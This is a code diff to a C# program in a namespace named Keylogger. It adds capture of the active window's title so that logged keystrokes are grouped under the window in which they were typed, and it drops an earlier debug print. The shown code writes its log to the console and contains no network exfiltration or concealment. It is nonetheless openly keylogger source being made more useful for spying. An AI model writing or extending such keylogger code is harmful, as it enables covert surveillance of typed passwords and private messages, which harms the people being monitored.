@@ -31,6 +31,7 @@ namespace Keylogger
 
         private void start()
         {
+            string currentWindowTitle = "";
             bool isShift = false;
             bool isCapital = false;
             string text = "";
@@ -111,6 +112,14 @@ namespace Keylogger
                             isShift = false;
                         }
 
+                        // Get the foreground window's title
+                        string windowTitle = getForegroundWindowTitle();
+                        if (windowTitle != currentWindowTitle && windowTitle != "")
+                        {
+                            currentWindowTitle = windowTitle;
+                            text = text + $"\n\n[Foreground Window : {currentWindowTitle}]\n";
+                        }
+
                         // Write the log
                         text = text + keyString;
 
@@ -121,19 +130,17 @@ namespace Keylogger
 
 
                         Console.WriteLine(text);
-
-                        
-
-                        string windowTitle = getForegroundWindowTitle();
-                        Console.WriteLine("windowTitle : " + windowTitle);
                     }
                 }
             }
         }
 
 
+        
         public string getForegroundWindowTitle()
         {
+            // https://stackoverflow.com/questions/115868/how-do-i-get-the-title-of-the-current-active-window-using-c
+
             const int nChars = 256;
             StringBuilder Buff = new StringBuilder(nChars);
             IntPtr handle = GetForegroundWindow();
